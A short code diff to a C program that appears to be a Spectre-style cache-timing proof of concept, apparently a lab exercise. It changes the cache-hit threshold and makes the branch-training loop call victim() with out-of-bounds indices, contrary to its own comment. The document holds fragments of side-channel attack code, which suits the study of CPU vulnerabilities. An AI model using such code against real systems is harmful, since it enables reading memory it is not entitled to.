@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <stdint.h>
 
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (39)
 #define DELTA 1024
 
 int size = 10;
@@ -55,7 +55,7 @@ int main() {
 
   // Train the CPU to take the true branch inside victim()
   for (i = 0; i < 10; i++) {   
-      victim(i);
+      victim(i + 20);
   }
 
   // Exploit the out-of-order execution
